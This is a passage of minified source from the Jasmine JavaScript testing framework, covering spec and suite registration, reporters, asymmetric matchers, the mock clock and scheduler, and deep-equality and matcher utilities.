d=!1;b.isLeaf?d=r.oneFailurePerSpec:b.isReporter||(d=r.failFast),b.clearStack=b.clearStack||l,b.timeout={setTimeout:j,clearTimeout:k},b.fail=g.fail,b.globalErrors=u,b.completeOnFirstError=d,b.onException=b.onException||function(a){(t()||K).onException(a)},b.deprecated=g.deprecated,new a.QueueRunner(b).execute(c)},K=new a.Suite({env:this,id:z(),description:"Jasmine__TopLevel__Suite",expectationFactory:A,asyncExpectationFactory:B,expectationResultFactory:I});C(K.id),p=K,this.topSuite=function(){return K};var L=new a.ReportDispatcher(["jasmineStarted","jasmineDone","suiteStarted","suiteDone","specStarted","specDone"],J);this.execute=function(b){v(),b||(b=R.length?R:[K.id]);var c=new a.Order({random:r.random,seed:r.seed}),d=new a.TreeProcessor({tree:K,runnableIds:b,queueRunnerFactory:J,nodeStart:function(a,b){o.push(a),C(a.id,a.parentSuite.id),L.suiteStarted(a.result,b)},nodeComplete:function(a,b,c){if(a!==s())throw new Error("Tried to complete the wrong suite");D(a.id),o.pop(),"failed"===b.status&&(q=!0),L.suiteDone(b,c)},orderChildren:function(a){return c.sort(a.children)},excludeNode:function(a){return!r.specFilter(a)}});if(!d.processTree().valid)throw new Error("Invalid order: would cause a beforeAll or afterAll to be run multiple times");L.jasmineStarted({totalSpecsDefined:i,order:c},function(){o.push(K),d.execute(function(){D(K.id),o.pop();var a,b;q||K.result.failedExpectations.length>0?a="failed":R.length>0?(a="incomplete",b="fit() or fdescribe() was found"):0===i?(a="incomplete",b="No specs found"):a="passed",L.jasmineDone({overallStatus:a,incompleteReason:b,order:c,failedExpectations:K.result.failedExpectations,deprecationWarnings:K.result.deprecationWarnings},function(){})})})},this.addReporter=function(a){L.addReporter(a)},this.provideFallbackReporter=function(a){L.provideFallbackReporter(a)},this.clearReporters=function(){L.clearReporters()};var M=new a.SpyFactory(function(){var a=t();return a?m[a.id].customSpyStrategies:{}}),N=new a.SpyRegistry({currentSpies:function(){if(!t())throw new Error("Spies must be created in a before function or a spec");return m[t().id].spies},createSpy:function(a,b){return g.createSpy(a,b)}});this.allowRespy=function(a){N.allowRespy(a)},this.spyOn=function(){return N.spyOn.apply(N,arguments)},this.spyOnProperty=function(){return N.spyOnProperty.apply(N,arguments)},this.spyOnAllFunctions=function(){return N.spyOnAllFunctions.apply(N,arguments)},this.createSpy=function(b,c){return 1===arguments.length&&a.isFunction_(b)&&(c=b,b=c.name),M.createSpy(b,c)},this.createSpyObj=function(a,b){return M.createSpyObj(a,b)};var O=function(b,c){if(!a.isFunction_(b))throw new Error(c+" expects a function argument; received "+a.getType_(b))},P=function(b,c){if(!a.isFunction_(b)&&!a.isAsyncFunction_(b))throw new Error(c+" expects a function argument; received "+a.getType_(b))},Q=function(b){return new a.Suite({env:g,id:z(),description:b,parentSuite:p,expectationFactory:A,asyncExpectationFactory:B,expectationResultFactory:I,throwOnExpectationFailure:r.oneFailurePerSpec})};this.describe=function(a,b){c("describe"),O(b,"describe");var e=Q(a);if(b.length>0)throw new Error("describe does not expect any arguments");return p.markedPending&&e.pend(),d(e,b),e},this.xdescribe=function(a,b){c("xdescribe"),O(b,"xdescribe");var e=Q(a);return e.pend(),d(e,b),e};var R=[];this.fdescribe=function(a,b){c("fdescribe"),O(b,"fdescribe");var e=Q(a);return e.isFocused=!0,R.push(e.id),f(),d(e,b),e};var S=function(b,c,d,e){function f(a,b){D(h.id),n=null,"failed"===a.status&&(q=!0),L.specDone(a,b)}function g(a,b){n=a,C(a.id,d.id),L.specStarted(a.result,b)}i++;var h=new a.Spec({id:x(),beforeAndAfterFns:E(d),expectationFactory:A,asyncExpectationFactory:B,resultCallback:f,getSpecName:function(a){return F(a,d)},onStart:g,description:b,expectationResultFactory:I,queueRunnerFactory:J,userContext:function(){return d.clonedSharedUserContext()},queueableFn:{fn:c,timeout:e||0},throwOnExpectationFailure:r.oneFailurePerSpec});return h};this.it=function(a,b,d){c("it"),arguments.length>1&&void 0!==b&&P(b,"it");var e=S(a,b,p,d);return p.markedPending&&e.pend(),p.addChild(e),e},this.xit=function(a,b,d){c("xit"),arguments.length>1&&void 0!==b&&P(b,"xit");var e=this.it.apply(this,arguments);return e.pend("Temporarily disabled with xit"),e},this.fit=function(a,b,d){c("fit"),P(b,"fit");var e=S(a,b,p,d);return p.addChild(e),R.push(e.id),f(),e},this.expect=function(a){if(!t())throw new Error("'expect' was used when there was no current spec, this could be because an asynchronous test timed out");return t().expect(a)},this.expectAsync=function(a){if(!t())throw new Error("'expectAsync' was used when there was no current spec, this could be because an asynchronous test timed out");return t().expectAsync(a)},this.beforeEach=function(a,b){c("beforeEach"),P(a,"beforeEach"),p.beforeEach({fn:a,timeout:b||0})},this.beforeAll=function(a,b){c("beforeAll"),P(a,"beforeAll"),p.beforeAll({fn:a,timeout:b||0})},this.afterEach=function(a,b){c("afterEach"),P(a,"afterEach"),a.isCleanup=!0,p.afterEach({fn:a,timeout:b||0})},this.afterAll=function(a,b){c("afterAll"),P(a,"afterAll"),p.afterAll({fn:a,timeout:b||0})},this.pending=function(b){var c=a.Spec.pendingSpecExceptionMessage;throw b&&(c+=b),c},this.fail=function(b){if(!t())throw new Error("'fail' was used when there was no current spec, this could be because an asynchronous test timed out");var c="Failed";if(b&&(c+=": ",b.message?c+=b.message:a.isString_(b)?c+=b:c+=a.pp(b)),t().addExpectationResult(!1,{matcherName:"",passed:!1,expected:"",actual:"",message:c,error:b&&b.message?b:null}),r.oneFailurePerSpec)throw new Error(c)}}return b},getJasmineRequireObj().JsApiReporter=function(){function a(a){function c(a){g.push(a),h[a.id]=a}var d=a.timer||b,e="loaded";this.started=!1,this.finished=!1,this.runDetails={},this.jasmineStarted=function(){this.started=!0,e="started",d.start()};var f;this.jasmineDone=function(a){this.finished=!0,this.runDetails=a,f=d.elapsed(),e="done"},this.status=function(){return e};var g=[],h={};this.suiteStarted=function(a){h[a.id]=a},this.suiteDone=function(a){c(a)},this.suiteResults=function(a,b){return g.slice(a,a+b)},this.suites=function(){return h};var i=[];this.specDone=function(a){i.push(a)},this.specResults=function(a,b){return i.slice(a,a+b)},this.specs=function(){return i},this.executionTime=function(){return f}}var b={start:function(){},elapsed:function(){return 0}};return a},getJasmineRequireObj().Any=function(a){function b(a){if(void 0===a)throw new TypeError("jasmine.any() expects to be passed a constructor function. Please pass one or use jasmine.anything() to match any object.");this.expectedObject=a}return b.prototype.asymmetricMatch=function(a){return this.expectedObject==String?"string"==typeof a||a instanceof String:this.expectedObject==Number?"number"==typeof a||a instanceof Number:this.expectedObject==Function?"function"==typeof a||a instanceof Function:this.expectedObject==Object?null!==a&&"object"==typeof a:this.expectedObject==Boolean?"boolean"==typeof a:"undefined"!=typeof Symbol&&this.expectedObject==Symbol?"symbol"==typeof a:a instanceof this.expectedObject},b.prototype.jasmineToString=function(){return"<jasmine.any("+a.fnNameFor(this.expectedObject)+")>"},b},getJasmineRequireObj().Anything=function(a){function b(){}return b.prototype.asymmetricMatch=function(b){return!a.util.isUndefined(b)&&null!==b},b.prototype.jasmineToString=function(){return"<jasmine.anything>"},b},getJasmineRequireObj().ArrayContaining=function(a){function b(a){this.sample=a}return b.prototype.asymmetricMatch=function(b,c){if(!a.isArray_(this.sample))throw new Error("You must provide an array to arrayContaining, not "+a.pp(this.sample)+".");for(var d=0;d<this.sample.length;d++){var e=this.sample[d];if(!a.matchersUtil.contains(b,e,c))return!1}return!0},b.prototype.jasmineToString=function(){return"<jasmine.arrayContaining("+a.pp(this.sample)+")>"},b},getJasmineRequireObj().ArrayWithExactContents=function(a){function b(a){this.sample=a}return b.prototype.asymmetricMatch=function(b,c){if(!a.isArray_(this.sample))throw new Error("You must provide an array to arrayWithExactContents, not "+a.pp(this.sample)+".");if(this.sample.length!==b.length)return!1;for(var d=0;d<this.sample.length;d++){var e=this.sample[d];if(!a.matchersUtil.contains(b,e,c))return!1}return!0},b.prototype.jasmineToString=function(){return"<jasmine.arrayWithExactContents "+a.pp(this.sample)+">"},b},getJasmineRequireObj().Empty=function(a){function b(){}return b.prototype.asymmetricMatch=function(b){return a.isString_(b)||a.isArray_(b)||a.isTypedArray_(b)?0===b.length:a.isMap(b)||a.isSet(b)?0===b.size:!!a.isObject_(b)&&0===Object.keys(b).length},b.prototype.jasmineToString=function(){return"<jasmine.empty>"},b},getJasmineRequireObj().Falsy=function(a){function b(){}return b.prototype.asymmetricMatch=function(a){return!a},b.prototype.jasmineToString=function(){return"<jasmine.falsy>"},b},getJasmineRequireObj().NotEmpty=function(a){function b(){}return b.prototype.asymmetricMatch=function(b){return a.isString_(b)||a.isArray_(b)||a.isTypedArray_(b)?0!==b.length:a.isMap(b)||a.isSet(b)?0!==b.size:!!a.isObject_(b)&&0!==Object.keys(b).length},b.prototype.jasmineToString=function(){return"<jasmine.notEmpty>"},b},getJasmineRequireObj().ObjectContaining=function(a){function b(a){this.sample=a}function c(a){return Object.getPrototypeOf?Object.getPrototypeOf(a):a.constructor.prototype==a?null:a.constructor.prototype}function d(a,b){return!!a&&(!!Object.prototype.hasOwnProperty.call(a,b)||d(c(a),b))}return b.prototype.asymmetricMatch=function(b,c){if("object"!=typeof this.sample)throw new Error("You must provide an object to objectContaining, not '"+this.sample+"'.");for(var e in this.sample)if(!d(b,e)||!a.matchersUtil.equals(this.sample[e],b[e],c))return!1;return!0},b.prototype.jasmineToString=function(){return"<jasmine.objectContaining("+a.pp(this.sample)+")>"},b},getJasmineRequireObj().StringMatching=function(a){function b(b){if(!a.isString_(b)&&!a.isA_("RegExp",b))throw new Error("Expected is not a String or a RegExp");this.regexp=new RegExp(b)}return b.prototype.asymmetricMatch=function(a){return this.regexp.test(a)},b.prototype.jasmineToString=function(){return"<jasmine.stringMatching("+this.regexp+")>"},b},getJasmineRequireObj().Truthy=function(a){function b(){}return b.prototype.asymmetricMatch=function(a){return!!a},b.prototype.jasmineToString=function(){return"<jasmine.truthy>"},b},getJasmineRequireObj().CallTracker=function(a){function b(){var b=[],c={};this.track=function(d){c.cloneArgs&&(d.args=a.util.cloneArgs(d.args)),b.push(d)},this.any=function(){return!!b.length},this.count=function(){return b.length},this.argsFor=function(a){var c=b[a];return c?c.args:[]},this.all=function(){return b},this.allArgs=function(){for(var a=[],c=0;c<b.length;c++)a.push(b[c].args);return a},this.first=function(){return b[0]},this.mostRecent=function(){return b[b.length-1]},this.reset=function(){b=[]},this.saveArgumentsByValue=function(){c.cloneArgs=!0}}return b},getJasmineRequireObj().clearStack=function(a){function b(a,b){var c=new a.MessageChannel,e={},f=e,g=!1;c.port1.onmessage=function(){e=e.next;var b=e.task;if(delete e.task,g)a.setTimeout(b,0);else try{g=!0,b()}finally{g=!1}};var h=0;return function(a){h++,h<d?(f=f.next={task:a},c.port2.postMessage(0)):(h=0,b(a))}}function c(c){var e=0,f=c.setTimeout,g=function(a){Function.prototype.apply.apply(f,[c,[a,0]])};if(a.isFunction_(c.setImmediate)){var h=c.setImmediate;return function(a){e++,e<d?h(a):(e=0,g(a))}}return a.util.isUndefined(c.MessageChannel)?g:b(c,g)}var d=10;return c},getJasmineRequireObj().Clock=function(){function a(a,d,e){function f(){return a.setTimeout===p.setTimeout&&a.clearTimeout===p.clearTimeout&&a.setInterval===p.setInterval&&a.clearInterval===p.clearInterval}function g(a,b){for(var c in b)a[c]=b[c]}function h(a,d){if(!c)return m.scheduleFunction(a,d,l(arguments,2));var e=new b;return m.scheduleFunction(a,d,l(arguments,2),!1,e),e}function i(a){return m.removeFunctionWithId(a)}function j(a,d){if(!c)return m.scheduleFunction(a,d,l(arguments,2),!0);var e=new b;return m.scheduleFunction(a,d,l(arguments,2),!0,e),e}function k(a){return m.removeFunctionWithId(a)}function l(a,b){return Array.prototype.slice.call(a,b)}var m,n,o=this,p={setTimeout:a.setTimeout,clearTimeout:a.clearTimeout,setInterval:a.setInterval,clearInterval:a.clearInterval},q={setTimeout:h,clearTimeout:i,setInterval:j,clearInterval:k},r=!1;return o.FakeTimeout=b,o.install=function(){if(!f())throw new Error("Jasmine Clock was unable to install over custom global timer functions. Is the clock already installed?");return g(a,q),n=q,m=d(),r=!0,o},o.uninstall=function(){m=null,e.uninstall(),g(a,p),n=p,r=!1},o.withMock=function(a){this.install();try{a()}finally{this.uninstall()}},o.mockDate=function(a){e.install(a)},o.setTimeout=function(b,c,d){return Function.prototype.apply.apply(n.setTimeout,[a,arguments])},o.setInterval=function(b,c,d){return Function.prototype.apply.apply(n.setInterval,[a,arguments])},o.clearTimeout=function(b){return Function.prototype.call.apply(n.clearTimeout,[a,b])},o.clearInterval=function(b){return Function.prototype.call.apply(n.clearInterval,[a,b])},o.tick=function(a){if(!r)throw new Error("Mock clock is not installed, use jasmine.clock().install()");m.tick(a,function(a){e.tick(a)})},o}function b(){}var c="undefined"!=typeof process&&process.versions&&"string"==typeof process.versions.node;return b.prototype.ref=function(){return this},b.prototype.unref=function(){return this},a},getJasmineRequireObj().DelayedFunctionScheduler=function(j$){function DelayedFunctionScheduler(){function indexOfFirstToPass(a,b){for(var c=-1,d=0;d<a.length;++d)if(b(a[d])){c=d;break}return c}function deleteFromLookup(a){var b=Number(a),c=indexOfFirstToPass(scheduledLookup,function(a){return a===b});c>-1&&scheduledLookup.splice(c,1)}function reschedule(a){self.scheduleFunction(a.funcToCall,a.millis,a.params,!0,a.timeoutKey,a.runAtMillis+a.millis)}function forEachFunction(a,b){for(var c=0;c<a.length;++c)b(a[c])}function runScheduledFunctions(a,b){if(b=b||function(){},0===scheduledLookup.length||scheduledLookup[0]>a)return void b(a-currentTime);do{deletedKeys=[];var c=scheduledLookup.shift();b(c-currentTime),currentTime=c;var d=scheduledFunctions[currentTime];delete scheduledFunctions[currentTime],forEachFunction(d,function(a){a.recurring&&reschedule(a)}),forEachFunction(d,function(a){j$.util.arrayContains(deletedKeys,a.timeoutKey)||a.funcToCall.apply(null,a.params||[])}),deletedKeys=[]}while(scheduledLookup.length>0&&currentTime!==a&&scheduledLookup[0]<=a);currentTime!==a&&b(a-currentTime)}var self=this,scheduledLookup=[],scheduledFunctions={},currentTime=0,delayedFnCount=0,deletedKeys=[];return self.tick=function(a,b){a=a||0;var c=currentTime+a;runScheduledFunctions(c,b),currentTime=c},self.scheduleFunction=function(funcToCall,millis,params,recurring,timeoutKey,runAtMillis){var f;f="string"==typeof funcToCall?function(){return eval(funcToCall)}:funcToCall,millis=millis||0,timeoutKey=timeoutKey||++delayedFnCount,runAtMillis=runAtMillis||currentTime+millis;var funcToSchedule={runAtMillis:runAtMillis,funcToCall:f,recurring:recurring,params:params,timeoutKey:timeoutKey,millis:millis};return runAtMillis in scheduledFunctions?scheduledFunctions[runAtMillis].push(funcToSchedule):(scheduledFunctions[runAtMillis]=[funcToSchedule],scheduledLookup.push(runAtMillis),scheduledLookup.sort(function(a,b){return a-b})),timeoutKey},self.removeFunctionWithId=function(a){deletedKeys.push(a);for(var b in scheduledFunctions){var c=scheduledFunctions[b],d=indexOfFirstToPass(c,function(b){return b.timeoutKey===a});if(d>-1){1===c.length?(delete scheduledFunctions[b],deleteFromLookup(b)):c.splice(d,1);break}}},self}return DelayedFunctionScheduler},getJasmineRequireObj().errors=function(){function a(){}return a.prototype=new Error,a.prototype.constructor=a,{ExpectationFailed:a}},getJasmineRequireObj().ExceptionFormatter=function(a){function b(b){function c(a){var b=[],c="webkit"===a.style?"<Jasmine>":"    at <Jasmine>";return a.frames.forEach(function(a){a.file&&a.file!==e?b.push(a.raw):b[b.length-1]!==c&&b.push(c)}),b}function d(b){if(b instanceof Object){
var c=["name","message","stack","fileName","sourceURL","line","lineNumber","column","description"],d={},e=!0;for(var f in b)a.util.arrayContains(c,f)||(d[f]=b[f],e=!1);return e?"":"error properties: "+a.pp(d)+"\n"}}var e=b&&b.jasmineFile||a.util.jasmineFile();this.message=function(a){var b="";return a.name&&a.message?b+=a.name+": "+a.message:a.message?b+=a.message:b+=a.toString()+" thrown",(a.fileName||a.sourceURL)&&(b+=" in "+(a.fileName||a.sourceURL)),(a.line||a.lineNumber)&&(b+=" (line "+(a.line||a.lineNumber)+")"),b},this.stack=function(b){if(!b||!b.stack)return null;var e=new a.StackTrace(b),f=c(e),g="";return e.message&&f.unshift(e.message),g+=d(b),g+=f.join("\n")}}return b},getJasmineRequireObj().Expectation=function(a){function b(b){this.expector=new a.Expector(b);var c=b.customMatchers||{};for(var e in c)this[e]=d(e,c[e])}function c(b){var c=b.global||a.getGlobal();if(this.expector=new a.Expector(b),!c.Promise)throw new Error("expectAsync is unavailable because the environment does not support promises.");if(!a.isPromiseLike(this.expector.actual))throw new Error("Expected expectAsync to be called with a promise.")}function d(a,b){return function(){var c=this.expector.compare(a,b,arguments);this.expector.processResult(c)}}function e(b,c){return function(){var d=this,e=a.util.errorWithStack();return this.expector.compare(b,c,arguments).then(function(a){d.expector.processResult(a,e,k)})}}function f(a,b,c){for(var d in b){var e=b[d];a[d]=c(d,e)}}function g(a,b){var c=Object.create(a);return c.expector=a.expector.addFilter(b),c}function h(b,c,d,e){return b.message?a.isFunction_(b.message)?b.message():b.message:(d=d.slice(),d.unshift(!0),d.unshift(c),e.buildFailureMessage.apply(null,d))}function i(a){return a.pass=!a.pass,a}function j(a){this.message=a}var k={jasmineToString:function(){return"a promise"}};b.prototype.withContext=function(a){return g(this,new j(a))},Object.defineProperty(b.prototype,"not",{get:function(){return g(this,l)}}),c.prototype.withContext=function(a){return g(this,new j(a))},Object.defineProperty(c.prototype,"not",{get:function(){return g(this,m)}});var l={selectComparisonFunc:function(a){function b(){return i(a.compare.apply(null,arguments))}return a.negativeCompare||b},buildFailureMessage:h},m={selectComparisonFunc:function(a){function b(){return a.compare.apply(this,arguments).then(i)}return b},buildFailureMessage:h};return j.prototype.modifyFailureMessage=function(a){return this.message+": "+a},{factory:function(a){return new b(a||{})},addCoreMatchers:function(a){f(b.prototype,a,d)},asyncFactory:function(a){return new c(a||{})},addAsyncCoreMatchers:function(a){f(c.prototype,a,e)}}},getJasmineRequireObj().ExpectationFilterChain=function(){function a(a,b){this.filter_=a,this.prev_=b}return a.prototype.addFilter=function(b){return new a(b,this)},a.prototype.selectComparisonFunc=function(a){return this.callFirst_("selectComparisonFunc",arguments).result},a.prototype.buildFailureMessage=function(a,b,c,d){return this.callFirst_("buildFailureMessage",arguments).result},a.prototype.modifyFailureMessage=function(a){return this.callFirst_("modifyFailureMessage",arguments).result||a},a.prototype.callFirst_=function(a,b){var c;return this.prev_&&(c=this.prev_.callFirst_(a,b),c.found)?c:this.filter_&&this.filter_[a]?{found:!0,result:this.filter_[a].apply(this.filter_,b)}:{found:!1}},a},getJasmineRequireObj().buildExpectationResult=function(){function a(a){function b(){return a.passed?"Passed.":a.message?a.message:a.error?c(a.error):""}var c=a.messageFormatter||function(){},d=a.stackFormatter||function(){},e={matcherName:a.matcherName,message:b(),stack:function(){if(a.passed)return"";var c=a.error;if(!c)if(a.errorForStack)c=a.errorForStack;else if(a.stack)c=a;else try{throw new Error(b())}catch(a){c=a}return d(c)}(),passed:a.passed};return e.passed||(e.expected=a.expected,e.actual=a.actual),e}return a},getJasmineRequireObj().Expector=function(a){function b(b){this.util=b.util||{buildFailureMessage:function(){}},this.customEqualityTesters=b.customEqualityTesters||[],this.actual=b.actual,this.addExpectationResult=b.addExpectationResult||function(){},this.filters=new a.ExpectationFilterChain}return b.prototype.instantiateMatcher=function(a,b,c){this.matcherName=a,this.args=Array.prototype.slice.call(c,0),this.expected=this.args.slice(0),this.args.unshift(this.actual);var d=b(this.util,this.customEqualityTesters);return this.filters.selectComparisonFunc(d)||d.compare},b.prototype.buildMessage=function(b){function c(){if(b.message)return a.isFunction_(b.message)?b.message():b.message;var c=d.args.slice();return c.unshift(!1),c.unshift(d.matcherName),d.util.buildFailureMessage.apply(null,c)}var d=this;if(b.pass)return"";var e=this.filters.buildFailureMessage(b,this.matcherName,this.args,this.util,c);return this.filters.modifyFailureMessage(e||c())},b.prototype.compare=function(a,b,c){return this.instantiateMatcher(a,b,c).apply(null,this.args)},b.prototype.addFilter=function(a){var b=Object.create(this);return b.filters=this.filters.addFilter(a),b},b.prototype.processResult=function(a,b,c){this.args[0]=c||this.args[0];var d=this.buildMessage(a);1===this.expected.length&&(this.expected=this.expected[0]),this.addExpectationResult(a.pass,{matcherName:this.matcherName,passed:a.pass,message:d,error:b?void 0:a.error,errorForStack:b||void 0,actual:this.actual,expected:this.expected})},b},getJasmineRequireObj().formatErrorMsg=function(){function a(a,b){var c=b?"\nUsage: "+b:"";return function(b){return a+" : "+b+c}}return a},getJasmineRequireObj().GlobalErrors=function(a){function b(b){var c=[];b=b||a.getGlobal();var d=function(){var a=c[c.length-1];if(!a)throw arguments[0];a.apply(null,Array.prototype.slice.call(arguments,0))};this.originalHandlers={},this.installOne_=function(a){this.originalHandlers[a]=b.process.listeners(a),b.process.removeAllListeners(a),b.process.on(a,d),this.uninstall=function(){for(var a=Object.keys(this.originalHandlers),c=0;c<a.length;c++){var e=a[c];b.process.removeListener(e,d);for(var f=0;f<this.originalHandlers[e].length;f++)b.process.on(e,this.originalHandlers[e][f]);delete this.originalHandlers[e]}}},this.install=function(){if(b.process&&b.process.listeners&&a.isFunction_(b.process.on))this.installOne_("uncaughtException"),this.installOne_("unhandledRejection");else{var c=b.onerror;b.onerror=d,this.uninstall=function(){b.onerror=c}}},this.pushListener=function(a){c.push(a)},this.popListener=function(){c.pop()}}return b},getJasmineRequireObj().toBeRejected=function(a){return function(a){return{compare:function(a){return a.then(function(){return{pass:!1}},function(){return{pass:!0}})}}}},getJasmineRequireObj().toBeRejectedWith=function(a){return function(b,c){return{compare:function(d,e){function f(b){return"Expected a promise "+(b?"not ":"")+"to be rejected with "+a.pp(e)}return d.then(function(){return{pass:!1,message:f(!1)+" but it was resolved."}},function(d){return b.equals(d,e,c)?{pass:!0,message:f(!0)+"."}:{pass:!1,message:f(!1)+" but it was rejected with "+a.pp(d)+"."}})}}}},getJasmineRequireObj().toBeResolved=function(a){return function(a){return{compare:function(a){return a.then(function(){return{pass:!0}},function(){return{pass:!1}})}}}},getJasmineRequireObj().toBeResolvedTo=function(a){return function(b,c){return{compare:function(d,e){function f(b){return"Expected a promise "+(b?"not ":"")+"to be resolved to "+a.pp(e)}return d.then(function(d){return b.equals(d,e,c)?{pass:!0,message:f(!0)+"."}:{pass:!1,message:f(!1)+" but it was resolved to "+a.pp(d)+"."}},function(){return{pass:!1,message:f(!1)+" but it was rejected."}})}}}},getJasmineRequireObj().DiffBuilder=function(a){return function(){function b(b,c,d){return"Expected "+d+(d.depth()?" = ":"")+a.pp(b)+" to equal "+a.pp(c)+"."}var c=new a.ObjectPath,d=[];return{record:function(a,e,f){f=f||b,d.push(f(a,e,c))},getMessage:function(){return d.join("\n")},withPath:function(a,b){var d=c;c=c.add(a),b(),c=d}}}},getJasmineRequireObj().matchersUtil=function(a){function b(b){return b&&a.isA_("Function",b.asymmetricMatch)}function c(a,c,d,e){var f,g=b(a),h=b(c);if(!g||!h)return g?(f=a.asymmetricMatch(c,d),f||e.record(a,c),f):h?(f=c.asymmetricMatch(a,d),f||e.record(a,c),f):void 0}function d(b,c,d,f){return d=d||[],f=f||a.NullDiffBuilder(),e(b,c,[],[],d,f)}function e(d,k,l,m,n,o){var p,q=!0,r=c(d,k,n,o);if(!a.util.isUndefined(r))return r;for(p=0;p<n.length;p++){var s=n[p](d,k);if(!a.util.isUndefined(s))return s||o.record(d,k),s}if(d instanceof Error&&k instanceof Error)return q=d.message==k.message,q||o.record(d,k),q;if(d===k)return q=0!==d||1/d==1/k,q||o.record(d,k),q;if(null===d||null===k)return q=d===k,q||o.record(d,k),q;var t=Object.prototype.toString.call(d);if(t!=Object.prototype.toString.call(k))return o.record(d,k),!1;switch(t){case"[object String]":return q=d==String(k),q||o.record(d,k),q;case"[object Number]":return q=d!=+d?k!=+k:0===d?1/d==1/k:d==+k,q||o.record(d,k),q;case"[object Date]":case"[object Boolean]":return q=+d==+k,q||o.record(d,k),q;case"[object RegExp]":return d.source==k.source&&d.global==k.global&&d.multiline==k.multiline&&d.ignoreCase==k.ignoreCase}if("object"!=typeof d||"object"!=typeof k)return o.record(d,k),!1;var u=a.isDomNode(d),v=a.isDomNode(k);if(u&&v)return q=d.isEqualNode(k),q||o.record(d,k),q;if(u||v)return o.record(d,k),!1;var w=a.isPromise(d),x=a.isPromise(k);if(w&&x)return d===k;for(var y=l.length;y--;)if(l[y]==d)return m[y]==k;l.push(d),m.push(k);var z=0;if("[object Array]"==t){var A=d.length,B=k.length;for(o.withPath("length",function(){A!==B&&(o.record(A,B),q=!1)}),p=0;p<A||p<B;p++){o.withPath(p,function(){p>=B?(o.record(d[p],void 0,j),q=!1):q=e(p<A?d[p]:void 0,p<B?k[p]:void 0,l,m,n,o)&&q})}if(!q)return!1}else if(a.isMap(d)&&a.isMap(k)){if(d.size!=k.size)return o.record(d,k),!1;var C=[],D=[];d.forEach(function(a,b){C.push(b)}),k.forEach(function(a,b){D.push(b)});var E,F,G,H,I,J,K=[C,D],L=[D,C];for(p=0;q&&p<K.length;p++){E=K[p],I=L[p];for(var M=0;q&&M<E.length;M++)F=E[M],J=I[M],G=d.get(F),H=b(F)||b(J)&&e(F,J,l,m,n,a.NullDiffBuilder())?k.get(J):k.get(F),q=e(G,H,l,m,n,a.NullDiffBuilder())}if(!q)return o.record(d,k),!1}else if(a.isSet(d)&&a.isSet(k)){if(d.size!=k.size)return o.record(d,k),!1;var N=[];d.forEach(function(a){N.push(a)});var O=[];k.forEach(function(a){O.push(a)});var P,Q,R,S,T,U,V,W,X=[[N,O],[O,N]],Y=[[l,m],[m,l]];for(p=0;q&&p<X.length;p++){P=X[p][0],S=X[p][1],R=Y[p][0],U=Y[p][1];for(var Z=0;q&&Z<P.length;Z++){Q=P[Z],V=!1;for(var $=0;!V&&$<S.length;$++)T=S[$],W=R.length,(V=e(Q,T,R,U,n,a.NullDiffBuilder()))||W===R.length||(R.splice(W),U.splice(W));q=q&&V}}if(!q)return o.record(d,k),!1}else{var _=d.constructor,aa=k.constructor;if(_!==aa&&g(_)&&g(aa)&&d instanceof _&&k instanceof aa&&!(_ instanceof _&&aa instanceof aa))return o.record(d,k,i),!1}var ba,ca=f(d,"[object Array]"==t);if(z=ca.length,f(k,"[object Array]"==t).length!==z)return o.record(d,k,h),!1;for(p=0;p<z;p++)ba=ca[p],a.util.has(k,ba)?o.withPath(ba,function(){e(d[ba],k[ba],l,m,n,o)||(q=!1)}):(o.record(d,k,h),q=!1);return!!q&&(l.pop(),m.pop(),q)}function f(b,c){var d=Object.keys?Object.keys(b):function(b){var c=[];for(var d in b)a.util.has(b,d)&&c.push(d);return c}(b);if(!c)return d;if(0===d.length)return d;for(var e=[],f=0;f<d.length;f++)/^[0-9]+$/.test(d[f])||e.push(d[f]);return e}function g(a){return"function"==typeof a}function h(b,c,d){var e=a.util.objectDifference(c,b),f=a.util.objectDifference(b,c),g=k(e),h=k(f),i=[];return d.depth()||(d="object"),g.length&&i.push("Expected "+d+" to have properties"+g),h.length&&i.push("Expected "+d+" not to have properties"+h),i.join("\n")}function i(b,c,d){return d.depth()||(d="object"),"Expected "+d+" to be a kind of "+a.fnNameFor(c.constructor)+", but was "+a.pp(b)+"."}function j(b,c,d){return"Unexpected "+d+(d.depth()?" = ":"")+a.pp(b)+" in array."}function k(b){var c="";for(var d in b)c+="\n    "+d+": "+a.pp(b[d]);return c}return{equals:d,contains:function(a,b,c){if(c=c||[],"[object Set]"===Object.prototype.toString.apply(a))return a.has(b);if("[object Array]"===Object.prototype.toString.apply(a)||a&&!a.indexOf){for(var e=0;e<a.length;e++)if(d(a[e],b,c))return!0;return!1}return!!a&&a.indexOf(b)>=0},buildFailureMessage:function(){var b=Array.prototype.slice.call(arguments,0),c=b[0],d=b[1],e=b[2],f=b.slice(3),g=c.replace(/[A-Z]/g,function(a){return" "+a.toLowerCase()}),h="Expected "+a.pp(e)+(d?" not ":" ")+g;if(f.length>0)for(var i=0;i<f.length;i++)i>0&&(h+=","),h+=" "+a.pp(f[i]);return h+"."}}},getJasmineRequireObj().nothing=function(){function a(){return{compare:function(){return{pass:!0}}}}return a},getJasmineRequireObj().NullDiffBuilder=function(a){return function(){return{withPath:function(a,b){b()},record:function(){}}}},getJasmineRequireObj().ObjectPath=function(a){function b(a){this.components=a||[]}function c(a){return"number"==typeof a?"["+a+"]":e(a)?"."+a:"['"+a+"']"}function d(a,b){for(var c=[],d=0;d<a.length;d++)c.push(b(a[d]));return c}function e(a){return/^[A-Za-z\$_][A-Za-z0-9\$_]*$/.test(a)}return b.prototype.toString=function(){return this.components.length?"$"+d(this.components,c).join(""):""},b.prototype.add=function(a){return new b(this.components.concat([a]))},b.prototype.depth=function(){return this.components.length},b},getJasmineRequireObj().requireAsyncMatchers=function(a,b){for(var c=["toBeResolved","toBeRejected","toBeResolvedTo","toBeRejectedWith"],d={},e=0;e<c.length;e++){var f=c[e];d[f]=a[f](b)}return d},getJasmineRequireObj().toBe=function(a){function b(a){return{compare:function(b,c){var d={pass:b===c};return"object"==typeof c&&(d.message=a.buildFailureMessage("toBe",d.pass,b,c)+" Tip: To check for deep equality, use .toEqual() instead of .toBe()."),d}}}return b},getJasmineRequireObj().toBeCloseTo=function(){function a(){return{compare:function(a,b,c){if(0!==c&&(c=c||2),null===b||null===a)throw new Error("Cannot use toBeCloseTo with null. Arguments evaluated to: expect("+a+").toBeCloseTo("+b+").");var d=Math.pow(10,c+1),e=Math.abs(b-a),f=Math.pow(10,-c)/2;return{pass:Math.round(e*d)/d<=f}}}}return a},getJasmineRequireObj().toBeDefined=function(){function a(){return{compare:function(a){return{pass:void 0!==a}}}}return a},getJasmineRequireObj().toBeFalsy=function(){function 